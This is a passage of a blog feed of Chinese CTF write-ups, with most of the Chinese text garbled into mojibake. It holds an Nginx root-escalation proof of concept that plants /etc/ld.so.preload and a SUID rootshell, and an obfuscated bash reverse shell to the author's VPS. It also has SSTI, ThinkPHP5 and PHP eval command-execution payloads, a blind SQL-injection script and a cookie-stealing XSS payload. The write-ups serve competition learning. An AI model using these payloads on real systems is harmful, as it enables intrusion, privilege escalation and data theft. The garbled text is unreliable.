class="line">rm -f $ERRORLOG</span><br><span class="line">break;</span><br><span class="line">fi</span><br><span class="line">done</span><br><span class="line"># &#x2F;etc&#x2F;ld.so.preload should be owned by www-data user at this point</span><br><span class="line"># Inject the privesc.so shared library to escalate privileges</span><br><span class="line">echo $PRIVESCLIB &gt; &#x2F;etc&#x2F;ld.so.preload</span><br><span class="line">echo -e &quot;\n[+] Nginx restarted. The &#x2F;etc&#x2F;ld.so.preload file got created with web server privileges: \n&#96;ls -l &#x2F;etc&#x2F;ld.so.preload&#96;&quot;</span><br><span class="line">echo -e &quot;\n[+] Adding $PRIVESCLIB shared lib to &#x2F;etc&#x2F;ld.so.preload&quot;</span><br><span class="line">echo -e &quot;\n[+] The &#x2F;etc&#x2F;ld.so.preload file now contains: \n&#96;cat &#x2F;etc&#x2F;ld.so.preload&#96;&quot;</span><br><span class="line">chmod 755 &#x2F;etc&#x2F;ld.so.preload</span><br><span class="line"># Escalating privileges via the SUID binary (e.g. &#x2F;usr&#x2F;bin&#x2F;sudo)</span><br><span class="line">echo -e &quot;\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!&quot;</span><br><span class="line">sudo 2&gt;&#x2F;dev&#x2F;null &gt;&#x2F;dev&#x2F;null</span><br><span class="line"># Check for the rootshell</span><br><span class="line">ls -l $BACKDOORPATH</span><br><span class="line">ls -l $BACKDOORPATH | grep rws | grep -q root</span><br><span class="line">if [ $? -eq 0 ]; then </span><br><span class="line">echo -e &quot;\n[+] Rootshell got assigned root SUID perms at: \n&#96;ls -l $BACKDOORPATH&#96;&quot;</span><br><span class="line">echo -e &quot;\n\033[94mThe server is (N)jinxed ! ;) Got root via Nginx!\033[0m&quot;</span><br><span class="line">else</span><br><span class="line">echo -e &quot;\n[!] Failed to get root&quot;</span><br><span class="line">cleanexit 2</span><br><span class="line">fi</span><br><span class="line">rm -f $ERRORLOG</span><br><span class="line">echo &gt; $ERRORLOG</span><br><span class="line">  </span><br><span class="line"># Use the rootshell to perform cleanup that requires root privilges</span><br><span class="line">$BACKDOORPATH -p -c &quot;rm -f &#x2F;etc&#x2F;ld.so.preload; rm -f $PRIVESCLIB&quot;</span><br><span class="line"># Reset the logging to error.log</span><br><span class="line">$BACKDOORPATH -p -c &quot;kill -USR1 &#96;pidof -s nginx&#96;&quot;</span><br><span class="line"># Execute the rootshell</span><br><span class="line">echo -e &quot;\n[+] Spawning the rootshell $BACKDOORPATH now! \n&quot;</span><br><span class="line">$BACKDOORPATH -p -i</span><br><span class="line"># Job done.</span><br><span class="line">cleanexit 0ï¼šDebianã€ubuntuå‘è¡Œç‰ˆçš„Nginxæœ¬åœ°ææƒæ¼æ´ï¼ˆå«POCï¼‰</span><br></pre></td></tr></table></figure>
<p>å°†pocä¸Šä¼ åˆ°/var/www/html/ç›®å½•ä¸‹é¢,æ›´æ”¹777æƒé™,æ›´æ”¹æ–‡ä»¶åä¸ºpoc.sh</p>
<p>åœ¨èšå‰‘çš„ç»ˆç«¯ä¸­ç”¨bashåå¼¹ä¸€ä¸ªshellåˆ°vps,ç„¶ååœ¨vpsæ‰§è¡Œä¸€ä¸‹å‘½ä»¤,ç­‰å¾…cronå®šæ—¶ä»»åŠ¡æ‰§è¡Œ,è§¦å‘æ¼æ´å¾—åˆ°rootæƒé™</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line">.&#x2F;poc.sh &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</span><br><span class="line">cat &#x2F;flag</span><br></pre></td></tr></table></figure>
<h3 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h3><h4 id="åˆ†æ-3"><a href="#åˆ†æ-3" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p>fuzzä¸€ä¸‹åªèƒ½5ä¸ªå­—ç¬¦,or and =ä¸èƒ½ç”¨</p>
<p>ä½†æ˜¯&amp;&amp; || &lt;&gt;å¯ä»¥,åªèƒ½äº”ä¸ªå­—ç¬¦,ä¾¿æ€è€ƒé€»è¾‘</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--çŒœæµ‹åå°sql</span><br><span class="line">select * from table where username&#x3D;&#39;&#39; and password&#x3D;&#39;&#39;</span><br><span class="line">--æ„é€ é€»è¾‘</span><br><span class="line">select * from table where username&#x3D;&#39;1&#39;&lt;&#39;2&#39; and password&#x3D;&#39;1&#39;&lt;&#39;2&#39;</span><br></pre></td></tr></table></figure>
<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">u&#x3D;1&#39;&lt;&#39;2&amp;p&#x3D;1&#39;&lt;&#39;2</span><br></pre></td></tr></table></figure>
<h3 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h3><h4 id="åˆ†æ-4"><a href="#åˆ†æ-4" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p>evalä»¥åˆ†å·ä½œä¸ºè¯­å¥åˆ†éš”ç¬¦,ç›´æ¥ç»“æŸå‰é¢ä¸€æ®µä»£ç å¦èµ·ç‚‰ç¶</p>
<h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a;phpinfo();</span><br><span class="line">a;system(&#39;cat &#x2F;var&#x2F;falg.txt&#39;)</span><br></pre></td></tr></table></figure>
<p>flagæ‰¾ä¸€æ‰¾åœ¨varä¸‹é¢</p>
<h2 id="å¯†ç "><a href="#å¯†ç " class="headerlink" title="å¯†ç "></a>å¯†ç </h2><h3 id="å¯†ç 2"><a href="#å¯†ç 2" class="headerlink" title="å¯†ç 2"></a>å¯†ç 2</h3><p>ä¸‹è½½å¾—åˆ°æ–‡ä»¶,ctfæ›¿æ¢<code>.</code>showæ›¿æ¢<code>-</code>morseè§£ç åœ¨å¾—åˆ°äº†FLAGå››ä¸ªå­—</p>
<p>ç„¶ååé¢éƒ½æ˜¯å››ä¸ª16è¿›åˆ¶ç ä¸€ç»„,utf-8è§£ç å¾—åˆ°flag</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>2020ç¬¬äºŒå±ŠBJDCTF</title>
    <url>/2020/03/23/CTF_WP/BJDCTFWP/</url>
    <content><![CDATA[<h1 id="2020ç¬¬äºŒå±ŠBJDCTF"><a href="#2020ç¬¬äºŒå±ŠBJDCTF" class="headerlink" title="2020ç¬¬äºŒå±ŠBJDCTF"></a>2020ç¬¬äºŒå±ŠBJDCTF</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="fakegoogle"><a href="#fakegoogle" class="headerlink" title="fakegoogle"></a>fakegoogle</h3><p>æºç æ³¨é‡Šæ˜¯SSTI</p>
<a id="more"></a>

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;qaq?name&#x3D;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">&#x2F;qaq?name&#x3D;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
<h3 id="old-hack"><a href="#old-hack" class="headerlink" title="old_hack"></a>old_hack</h3><p>åˆ©ç”¨çš„æ˜¯thinkphp5çš„RCEæ¼æ´</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;a06ef095-a650-4053-96ad-444239c9d4db.node3.buuoj.cn&#x2F;?s&#x3D;captcha</span><br><span class="line">post data:_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure>
<h3 id="duangshell"><a href="#duangshell" class="headerlink" title="duangshell"></a>duangshell</h3><p>ä¸‹è½½.index.php.swp,</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim index.php</span><br><span class="line">#æŒ‰Rè¿˜åŸå‡ºæºç </span><br></pre></td></tr></table></figure>
<p>æ³¨å†Œå°å·ç”³è¯·é¶æœº,ifconfigå¾—åˆ°é¶æœºçš„ip,åˆ©ç”¨bashæ„é€ ä¸€å¥è¯åå¼¹shell,ä¸¤æ¬¡baseç¼–ç åå‘é€payload</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ec&#39;&#39;ho &quot;WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE56UXVNUzQwT0M0M01DODRPRGc0SURBK0pqRT0&#x3D;&quot;|bas&#39;&#39;e64 -d|bas&#39;&#39;e64 -d|bash</span><br></pre></td></tr></table></figure>
<h3 id="ç®€å•æ³¨å…¥"><a href="#ç®€å•æ³¨å…¥" class="headerlink" title="ç®€å•æ³¨å…¥"></a>ç®€å•æ³¨å…¥</h3><p>æ³¨å…¥è„šæœ¬</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;796d3f72-9ab1-4366-a553-0f1bee62ea1c.node3.buuoj.cn&#x2F;&quot;</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    high &#x3D; 127</span><br><span class="line">    low &#x3D; 32</span><br><span class="line">    mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class="line">    while high &gt; low:</span><br><span class="line">        # password&#x3D;&#39;or ascii(substr(username,%s,1))&gt;%s#&#39;%(str(i),str(mid))</span><br><span class="line">        password &#x3D; &#39;or ascii(substr(password,%s,1))&gt;%s#&#39; % (str(i), str(mid))</span><br><span class="line">        payload &#x3D; &#123;&#39;username&#39;:&quot;\\&quot;, &#39;password&#39;:password&#125;</span><br><span class="line">        # print(payload)</span><br><span class="line">        r&#x3D;requests.post(url,data&#x3D;payload)</span><br><span class="line">        if &#39;BJD needs to be stronger&#39; in r.text:</span><br><span class="line">            low &#x3D; mid + 1</span><br><span class="line">        else:</span><br><span class="line">            high &#x3D; mid</span><br><span class="line">        mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class="line">        print(chr(int(mid)),end&#x3D;&quot;&quot;)</span><br><span class="line">    flag+&#x3D;chr(int(mid))</span><br><span class="line">    print(&quot; | &quot;+flag)</span><br><span class="line">#ç»“æœ,ç™»å½•å¾—åˆ°flag</span><br><span class="line">admin</span><br><span class="line">OhyOuFOuNdit</span><br></pre></td></tr></table></figure>
<h3 id="å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€"><a href="#å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€" class="headerlink" title="å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€"></a>å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€</h3><p>ç™»å½•adminæç¤ºä¸æ˜¯admin,éšä¾¿è¾“ä¸€ä¸ªtest,ç™»å½•ä¸Š,æŠ“åŒ…å‘ç°æ³¨é‡ŠL0g1n.php</p>
<p>è®¿é—®L0g1n.php.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#æç¤º</span><br><span class="line">Sorry, this site will be available after totally 99 years!</span><br><span class="line">#æŸ¥çœ‹cookieså‘ç°æœ‰ä¸ªtime</span><br><span class="line">æ”¹æˆ9999999999</span><br><span class="line"></span><br><span class="line">#æç¤º</span><br><span class="line">Sorry, this site is only optimized for those who comes from localhost</span><br><span class="line">ä¿®æ”¹X-Forwarded-For:127.0.0.1</span><br><span class="line">#æç¤º</span><br><span class="line">Do u think that I dont know X-Forwarded-For?Too young too simple sometimes naive</span><br><span class="line">#ä¿®æ”¹Client-IP:127.0.0.1</span><br><span class="line"></span><br><span class="line">#æç¤º</span><br><span class="line">Sorry, this site is only optimized for those who come from gem-love.com</span><br><span class="line">#ä¿®æ”¹Referer:gem-love.com</span><br><span class="line"></span><br><span class="line">#æç¤º</span><br><span class="line">Sorry, this site is only optimized for browsers that run on Commodo 64</span><br><span class="line">#ä¿®æ”¹User-Agent:Commodo 64</span><br><span class="line">#æç¤º</span><br><span class="line">no no no i think it is not the real commmodo 64,what is the real ua for Commdo?</span><br><span class="line">#google commmodo 64æœ‰ä¸€ä¸­è®¡ç®—æœºå«Commodore 64</span><br><span class="line">#ä¿®æ”¹User-Agent:Commodore 64</span><br><span class="line"></span><br><span class="line">#æç¤º</span><br><span class="line">Sorry, this site is only optimized for those whose email is root@gem-love.com</span><br><span class="line">#google http head email å‘ç°æœ‰ä¸€ä¸ªå¤´å«from</span><br><span class="line">#ä¿®æ”¹From:root@gem-love.com</span><br><span class="line"></span><br><span class="line">#æç¤º</span><br><span class="line">Sorry, this site is only optimized for those who use the http proxy of y1ng.vip if you dont have the proxy, pls contact us to buy, ï¿¥100&#x2F;Month</span><br><span class="line">#Via ä»£ç†æœåŠ¡å™¨çš„ç›¸å…³ä¿¡æ¯</span><br><span class="line">#ä¿®æ”¹Via:y1ng.vip</span><br><span class="line"></span><br><span class="line">#F12æŸ¥çœ‹å…ƒç´ </span><br><span class="line">&lt;!--ZmxhZ3tlYzI2ZmNhMS1mYWRmLTQ0YmItYTEyYS1lNjdjOWU5NTg3Nzh9Cg&#x3D;&#x3D;--&gt;</span><br><span class="line">base64è§£ç </span><br><span class="line">flag&#123;ec26fca1-fadf-44bb-a12a-e67c9e958778&#125;</span><br></pre></td></tr></table></figure>
<h3 id="SchroÌˆdinger"><a href="#SchroÌˆdinger" class="headerlink" title="SchroÌˆdinger"></a>SchroÌˆdinger</h3><p>æŸ¥çœ‹ç½‘é¡µæºä»£ç æœ‰ä¸ªtest.php,è¿‡å»çœ‹ä¸€çœ¼æ˜¯ç™»å½•æ¡†,é¦–é¡µæ˜¯ä¸€ä¸ªå¯†ç çˆ†ç ´,äºæ˜¯è®©ä»–è‡ªå·±çˆ†ç ´è‡ªå·±</p>
<p>ç™»å½•æ¡†è¾“å…¥<code>http://127.0.0.1/test.php</code>,æŒ‰input,å¼¹çª—æç¤ºURL Confirmed.æŸ¥çœ‹cookies</p>
<p><code>dXNlcg=MTU4NTAxNTkwMw%3D%3D</code>base64è§£ç å¾—åˆ°user=1585015903,ç”¨edit cookiesæ’ä»¶ç½®ç©º,åˆ·æ–°é¡µé¢99%äº†,ç‚¹check,å¾—åˆ°avå·,æŸ¥çœ‹è¯„è®ºåŒºæŒ‰æ—¶é—´æ’åº,æŸ¥çœ‹æœ€è¿‘çš„è¯„è®º,å¾—åˆ°flag</p>
<h3 id="XSSä¹‹å…‰"><a href="#XSSä¹‹å…‰" class="headerlink" title="XSSä¹‹å…‰"></a>XSSä¹‹å…‰</h3><p>æ‰«ç›®å½•å‘ç°gitæ³„éœ²,githackæ¢å¤å¾—åˆ°æºä»£ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; $_GET[&#39;yds_is_so_beautiful&#39;];</span><br><span class="line">echo unserialize($a);</span><br><span class="line">&lt;?php</span><br><span class="line">#åˆ©ç”¨åŸç”Ÿç±»xss</span><br><span class="line">$a &#x3D; new Exception(&#39;&lt;script&gt;window.open(document.cookie);&lt;&#x2F;script&gt;&#39;);</span><br><span class="line">#ç”±äºæºä»£ç æœ‰ä¸ªechoç›´æ¥ååºåˆ—åŒ–å­—ç¬¦ä¸²</span><br><span class="line">$a &#x3D; &#39;&lt;script&gt;window.open(document.cookie);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
<p>ä¼ è¿‡å»å¾—åˆ°flag</p>
<h3 id="elementmaster"><a href="#elementmaster" class="headerlink" title="elementmaster"></a>elementmaster</h3><p>æ£€æŸ¥å…ƒç´ å‘ç°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;p hidden&#x3D;&quot;&quot; id&#x3D;&quot;506F2E&quot;&gt;I am the real Element Masterrr!!!!!!&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p hidden&#x3D;&quot;&quot; id&#x3D;&quot;706870&quot;&gt;@é¢–å¥‡L&#39;Amore&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>
<p>hexè§£ç å¾—åˆ°Po.php</p>
<p>ä½¿ç”¨bpéå†å…ƒç´ å‘¨æœŸè¡¨ä¸­çš„å…ƒç´ .php</p>
<p>å¾—åˆ°And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php,è®¿é—®å¾—åˆ°flag</p>
<h3 id="æ–‡ä»¶æ¢æµ‹"><a href="#æ–‡ä»¶æ¢æµ‹" class="headerlink" title="æ–‡ä»¶æ¢æµ‹"></a>æ–‡ä»¶æ¢æµ‹</h3><p>headé‡Œé¢æœ‰hint home.php</p>
<p>è®¿é—®,å‘ç°urlåŒ…å«äº†system.php</p>
<p>ä½¿ç”¨ä¼ªåè®®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;home.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;system</span><br><span class="line">&#x2F;home.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;home</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°æºä»£ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;system.php</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (!isset($_COOKIE[&#39;y1ng&#39;]) || $_COOKIE[&#39;y1ng&#39;] !&#x3D;&#x3D; sha1(md5(&#39;y1ng&#39;)))&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&#39;why you are here!&#39;);alert(&#39;fxck your scanner&#39;);alert(&#39;fxck you! get out!&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">    header(&quot;Refresh:0.1;url&#x3D;index.php&quot;);</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str2 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ &#39;;</span><br><span class="line">$str3 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ &#39;;</span><br><span class="line">$str4 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ &#39;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD XHTML 1.0 Transitional&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;xhtml1&#x2F;DTD&#x2F;xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;title&gt;File Detector&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;normalize.css&quot; &#x2F;&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;demo.css&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;component.css&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script src&#x3D;&quot;js&#x2F;modernizr.custom.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;section&gt;</span><br><span class="line">    &lt;form id&#x3D;&quot;theForm&quot; class&#x3D;&quot;simform&quot; autocomplete&#x3D;&quot;off&quot; action&#x3D;&quot;system.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;simform-inner&quot;&gt;</span><br><span class="line">            &lt;span&gt;&lt;p&gt;&lt;center&gt;File Detector&lt;&#x2F;center&gt;&lt;&#x2F;p&gt;&lt;&#x2F;span&gt;</span><br><span class="line">            &lt;ol class&#x3D;&quot;questions&quot;&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label for&#x3D;&quot;q1&quot;&gt;ä½ çŸ¥é“ç›®å½•ä¸‹éƒ½æœ‰ä»€ä¹ˆæ–‡ä»¶å—?&lt;&#x2F;label&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;input id&#x3D;&quot;q1&quot; name&#x3D;&quot;q1&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;li&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label for&#x3D;&quot;q2&quot;&gt;è¯·è¾“å…¥ä½ æƒ³æ£€æµ‹æ–‡ä»¶å†…å®¹é•¿åº¦çš„url&lt;&#x2F;label&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;input id&#x3D;&quot;q2&quot; name&#x3D;&quot;q2&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;li&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label for&#x3D;&quot;q1&quot;&gt;ä½ å¸Œæœ›ä»¥ä½•ç§æ–¹å¼è®¿é—®ï¼ŸGETï¼ŸPOST?&lt;&#x2F;label&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;input id&#x3D;&quot;q3&quot; name&#x3D;&quot;q3&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;li&gt;</span><br><span class="line">            &lt;&#x2F;ol&gt;</span><br><span class="line">            &lt;button class&#x3D;&quot;submit&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot;&gt;æäº¤&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;div class&#x3D;&quot;controls&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;next&quot;&gt;&lt;&#x2F;button&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;progress&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">                &lt;span class&#x3D;&quot;number&quot;&gt;</span><br><span class="line">					&lt;span class&#x3D;&quot;number-current&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">					&lt;span class&#x3D;&quot;number-total&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">				&lt;&#x2F;span&gt;</span><br><span class="line">                &lt;span class&#x3D;&quot;error-message&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;span class&#x3D;&quot;final-message&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">    &lt;span&gt;&lt;p&gt;&lt;center&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;gem-love.com&quot; target&#x3D;&quot;_blank&quot;&gt;@é¢–å¥‡L&#39;Amore&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&lt;&#x2F;p&gt;&lt;&#x2F;span&gt;</span><br><span class="line">&lt;&#x2F;section&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;classie.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;stepsForm.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">    var theForm &#x3D; document.getElementById( &#39;theForm&#39; );</span><br><span class="line"></span><br><span class="line">    new stepsForm( theForm, &#123;</span><br><span class="line">        onSubmit : function( form ) &#123;</span><br><span class="line">            classie.addClass( theForm.querySelector( &#39;.simform-inner&#39; ), &#39;hide&#39; );</span><br><span class="line">            var messageEl &#x3D; theForm.querySelector( &#39;.final-message&#39; );</span><br><span class="line">            form.submit();</span><br><span class="line">            messageEl.innerHTML &#x3D; &#39;Ok...Let me have a check&#39;;</span><br><span class="line">            classie.addClass( messageEl, &#39;show&#39; );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; );</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$filter1 &#x3D; &#39;&#x2F;^http:\&#x2F;\&#x2F;127\.0\.0\.1\&#x2F;&#x2F;i&#39;;</span><br><span class="line">$filter2 &#x3D; &#39;&#x2F;.?f.?l.?a.?g.?&#x2F;i&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#39;q1&#39;]) &amp;&amp; isset($_POST[&#39;q2&#39;]) &amp;&amp; isset($_POST[&#39;q3&#39;]) ) &#123;</span><br><span class="line">    $url &#x3D; $_POST[&#39;q2&#39;].&quot;.y1ng.txt&quot;;</span><br><span class="line">    $method &#x3D; $_POST[&#39;q3&#39;];</span><br><span class="line"></span><br><span class="line">    $str1 &#x3D; &quot;~$ python fuck.py -u \&quot;&quot;.$url .&quot;\&quot; -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint&#x3D;xiangdemei&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    echo $str1;</span><br><span class="line"></span><br><span class="line">    if (!preg_match($filter1, $url) )&#123;</span><br><span class="line">        die($str2);</span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match($filter2, $url)) &#123;</span><br><span class="line">        die($str3);</span><br><span class="line">    &#125;</span><br><span class="line">    if (!preg_match(&#39;&#x2F;^GET&#x2F;i&#39;, $method) &amp;&amp; !preg_match(&#39;&#x2F;^POST&#x2F;i&#39;, $method)) &#123;</span><br><span class="line">        die($str4);</span><br><span class="line">    &#125;</span><br><span class="line">    $detect &#x3D; @file_get_contents($url, false);</span><br><span class="line">    print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨sprintfæ ¼å¼åŒ–å­—ç¬¦æ¼æ´</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q1&#x3D;y&amp;q2&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;admin.php?&amp;q3&#x3D;GET%25s%25</span><br><span class="line">&#x2F;&#x2F;admin.php?ä¸­çš„?æ˜¯ä¸ºäº†æŠŠæ‹¼æ¥çš„.y1ng.txtå½“æˆå‚æ•°åºŸæ‰</span><br><span class="line">&#x2F;&#x2F;%25æ˜¯%çš„urlç¼–ç ,ç¬¬ä¸€ä¸ª%sæ˜¯ä¸ºäº†æ ¼å¼åŒ–å¾—åˆ°detectçš„å€¼,ç¬¬äºŒä¸ª%æ˜¯ä¸ºè½¬ç§»æ‰%dä½¿å…¶å˜æˆ%%d,æ ¼å¼åŒ–è¾“å‡ºç»“æœå°±æ˜¯%d</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°admin.phpçš„æºç ,</p>
